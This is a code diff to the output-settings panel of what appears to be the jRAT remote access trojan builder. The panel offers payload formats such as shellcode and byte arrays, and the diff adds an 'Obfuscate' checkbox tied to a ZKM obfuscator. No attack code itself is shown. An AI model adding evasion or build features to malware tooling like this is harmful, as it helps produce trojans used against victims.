@@ -2,6 +2,7 @@ package pro.jrat.client.ui.panels;
 
 import java.awt.event.ActionEvent;
 import java.awt.event.ActionListener;
+import java.io.File;
 
 import javax.swing.ButtonGroup;
 import javax.swing.GroupLayout;
@@ -14,6 +15,7 @@ import javax.swing.LayoutStyle.ComponentPlacement;
 import pro.jrat.client.Help;
 import pro.jrat.client.ShellcodeGenerator;
 import pro.jrat.client.ui.frames.FrameExecutableInfo;
+import javax.swing.JCheckBox;
 
 @SuppressWarnings("serial")
 public class PanelBuildOutput extends JPanel {
@@ -30,6 +32,7 @@ public class PanelBuildOutput extends JPanel {
 	private JRadioButton rdbtnCArray;
 	private JRadioButton rdbtnexenetExecutable;
 	private JButton btnAssemblyInfo;
+	private JCheckBox chckbxObfuscate;
 
 	public boolean useShellcode() {
 		return rdbtnShellcode.isSelected();
@@ -126,9 +129,81 @@ public class PanelBuildOutput extends JPanel {
 				Help.help("Not recommended. Use third party tool instead.");
 			}
 		});
+		
+		chckbxObfuscate = new JCheckBox("Obfuscate");
+		
+		File zkmDir = new File("zkm/");
+		
+		if (!zkmDir.exists()) {
+			chckbxObfuscate.setEnabled(false);
+			chckbxObfuscate.setText("No ZKM installation found in /zkm/");
+		} else {
+			chckbxObfuscate.setSelected(true);
+		}
+		
 		GroupLayout groupLayout = new GroupLayout(this);
-		groupLayout.setHorizontalGroup(groupLayout.createParallelGroup(Alignment.LEADING).addGroup(groupLayout.createSequentialGroup().addGroup(groupLayout.createParallelGroup(Alignment.LEADING).addGroup(groupLayout.createSequentialGroup().addGap(37).addComponent(rdbtnShellcode)).addGroup(groupLayout.createSequentialGroup().addGap(58).addComponent(rdbtnCcArray)).addGroup(groupLayout.createSequentialGroup().addGap(58).addComponent(rdbtnPythonArray)).addGroup(groupLayout.createSequentialGroup().addGap(58).addComponent(rdbtnJavaArray)).addGroup(groupLayout.createSequentialGroup().addGap(58).addComponent(rdbtnDelphiArray)).addGroup(groupLayout.createSequentialGroup().addGap(58).addComponent(rdbtnCArray)).addGroup(groupLayout.createSequentialGroup().addGap(37).addGroup(groupLayout.createParallelGroup(Alignment.LEADING).addComponent(rdbtnjarjavaArchive).addGroup(groupLayout.createSequentialGroup().addComponent(rdbtnexenetExecutable).addGap(4).addComponent(btnAssemblyInfo).addPreferredGap(ComponentPlacement.RELATED).addComponent(button))))).addGap(76)));
-		groupLayout.setVerticalGroup(groupLayout.createParallelGroup(Alignment.LEADING).addGroup(groupLayout.createSequentialGroup().addGap(58).addComponent(rdbtnjarjavaArchive).addPreferredGap(ComponentPlacement.RELATED).addGroup(groupLayout.createParallelGroup(Alignment.LEADING).addComponent(rdbtnexenetExecutable).addGroup(groupLayout.createParallelGroup(Alignment.BASELINE).addComponent(btnAssemblyInfo).addComponent(button))).addGap(3).addComponent(rdbtnShellcode).addGap(3).addComponent(rdbtnCcArray).addGap(3).addComponent(rdbtnPythonArray).addGap(3).addComponent(rdbtnJavaArray).addGap(3).addComponent(rdbtnDelphiArray).addGap(3).addComponent(rdbtnCArray)));
+		groupLayout.setHorizontalGroup(
+			groupLayout.createParallelGroup(Alignment.LEADING)
+				.addGroup(groupLayout.createSequentialGroup()
+					.addGroup(groupLayout.createParallelGroup(Alignment.LEADING)
+						.addGroup(groupLayout.createSequentialGroup()
+							.addGap(37)
+							.addComponent(rdbtnShellcode))
+						.addGroup(groupLayout.createSequentialGroup()
+							.addGap(58)
+							.addComponent(rdbtnCcArray))
+						.addGroup(groupLayout.createSequentialGroup()
+							.addGap(58)
+							.addComponent(rdbtnPythonArray))
+						.addGroup(groupLayout.createSequentialGroup()
+							.addGap(58)
+							.addComponent(rdbtnJavaArray))
+						.addGroup(groupLayout.createSequentialGroup()
+							.addGap(58)
+							.addComponent(rdbtnDelphiArray))
+						.addGroup(groupLayout.createSequentialGroup()
+							.addGap(58)
+							.addComponent(rdbtnCArray))
+						.addGroup(groupLayout.createSequentialGroup()
+							.addGap(37)
+							.addGroup(groupLayout.createParallelGroup(Alignment.LEADING)
+								.addComponent(rdbtnexenetExecutable)
+								.addComponent(rdbtnjarjavaArchive))
+							.addGap(4)
+							.addGroup(groupLayout.createParallelGroup(Alignment.LEADING)
+								.addGroup(groupLayout.createSequentialGroup()
+									.addComponent(btnAssemblyInfo)
+									.addPreferredGap(ComponentPlacement.RELATED)
+									.addComponent(button))
+								.addComponent(chckbxObfuscate))))
+					.addGap(76))
+		);
+		groupLayout.setVerticalGroup(
+			groupLayout.createParallelGroup(Alignment.LEADING)
+				.addGroup(groupLayout.createSequentialGroup()
+					.addGap(58)
+					.addGroup(groupLayout.createParallelGroup(Alignment.BASELINE)
+						.addComponent(rdbtnjarjavaArchive)
+						.addComponent(chckbxObfuscate))
+					.addPreferredGap(ComponentPlacement.RELATED)
+					.addGroup(groupLayout.createParallelGroup(Alignment.LEADING)
+						.addComponent(rdbtnexenetExecutable)
+						.addGroup(groupLayout.createParallelGroup(Alignment.BASELINE)
+							.addComponent(btnAssemblyInfo)
+							.addComponent(button)))
+					.addGap(3)
+					.addComponent(rdbtnShellcode)
+					.addGap(3)
+					.addComponent(rdbtnCcArray)
+					.addGap(3)
+					.addComponent(rdbtnPythonArray)
+					.addGap(3)
+					.addComponent(rdbtnJavaArray)
+					.addGap(3)
+					.addComponent(rdbtnDelphiArray)
+					.addGap(3)
+					.addComponent(rdbtnCArray))
+		);
 		setLayout(groupLayout);
 
 	}
